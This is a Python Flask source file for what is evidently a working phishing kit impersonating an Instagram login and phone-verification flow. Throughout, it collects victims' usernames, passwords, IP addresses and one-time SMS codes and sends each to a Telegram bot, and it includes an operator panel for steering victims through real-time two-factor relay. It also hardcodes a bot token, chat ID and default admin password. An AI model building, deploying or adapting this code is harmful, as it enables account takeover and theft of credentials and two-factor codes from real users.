from datetime import datetime
from functools import wraps
import os

from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import requests
import uuid

app = Flask(__name__)
app.secret_key = "uni-project-secret-key"

# Configuration
BOT_TOKEN = "8539654733:AAHNcF_2YRuoSKjNjee3Kobb85jVa3QL5Yk"
sessions_db = {}

CHAT_IDS = ["8040951429"]


ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "gibligibli123")  # Change this to a strong password in production

def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return wrapper
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        password = request.form.get("password")

        if password == ADMIN_PASSWORD:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_panel"))

        return render_template("admin_login.html", error="Invalid password")

    return render_template("admin_login.html")


@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_login"))


def send_telegram(message):
    import requests
    # 2. Use the exact same name here (all caps)
    for chat_id in CHAT_IDS: 
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        try:
            r = requests.post(url, data=payload)
            # 3. Add a print to verify in Render logs
            print(f"Telegram response for {chat_id}: {r.status_code}")
        except Exception as e:
            print(f"Error sending to {chat_id}: {e}")


def get_client_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.headers.get("X-Real-IP") or request.remote_addr


@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def do_login():
    user = request.form.get("username")
    pw = request.form.get("password")
    ip = get_client_ip()
    
    session["target_username"] = user 
    session["target_password"] = pw
    session["target_ip"] = ip

    if "uid" not in session:
        session["uid"] = str(uuid.uuid4())
    
    uid = session["uid"]
    sessions_db[uid] = {"status": "waiting", "redirect_url": None}
    
    log = (
    f"<b>🔐 LOGIN ALERT</b>\n"
    f"━━━━━━━━━━━━━━━━━━\n"
    f"<b>User:</b> <code>{user}</code>\n"
    f"<b>Password:</b> <code>{pw}</code>\n"
    f"━━━━━━━━━━━━━━━━━━\n"
    f"<b>Session:</b> <code>{uid}</code>\n"
    f"<b>IP:</b> <code>{ip}</code>\n"
    f"<b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>"
)
    send_telegram(log)
    
    return jsonify({"status": "ok"})



@app.route("/api/check-status")
def check_status():
    uid = session.get("uid")
    if uid in sessions_db and sessions_db[uid]["redirect_url"]:
        return jsonify({"action": "redirect", "url": sessions_db[uid]["redirect_url"]})
    return jsonify({"action": "wait"})


@app.route("/number-verify")
def number_verify():
   
    display_user = session.get("target_username", "Instagram User")
    return render_template("sms.html", username=display_user)

@app.route("/api/submit-otp", methods=["POST"])
def submit_otp():
    data = request.get_json()
    code = data.get("code")
    uid = session.get("uid")
    ip = get_client_ip()
    user = session.get("target_username", "Instagram User")

    session["target_code"] = code

    log_message = (
    f"<b>📞 OTP Captured ({user})</b>\n"
    f"━━━━━━━━━━━━━━━━━━\n"
    f"\n"
    f"<b>OTP Code:</b> <code>{code}</code>\n"
    f"\n"
    f"━━━━━━━━━━━━━━━━━━\n"
    f"<b>Session:</b> <code>{uid}</code>\n"
    f"<b>IP:</b> <code>{ip}</code>\n"
    f"<b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"   
    )
    send_telegram(log_message)
    
    
    if uid in sessions_db:
        sessions_db[uid]["status"] = "waiting_otp_verification"
        sessions_db[uid]["redirect_url"] = None 
        
    return jsonify({"status": "success"})


@app.route("/success")
def success_page():
    return render_template("success.html")
# --- ADMIN PANEL ROUTES ---

@app.route("/admin")
@admin_required
def admin_panel():
    return render_template("admin.html", sessions=sessions_db, user=session.get("target_username"), pw=session.get("target_password"), ip=session.get("target_ip"), code = session.get("target_code"))

@app.route("/admin/redirect/<uid>/<path:target>")
@admin_required
def admin_redirect(uid, target):
    if uid in sessions_db:
        sessions_db[uid]["redirect_url"] = f"/{target}"
    return redirect(url_for("admin_panel"))

@app.route("/email-verify")
def email_verify():
    return "<h1>Email Verification Page</h1>"

if __name__ == "__main__":
    app.run(debug=True)
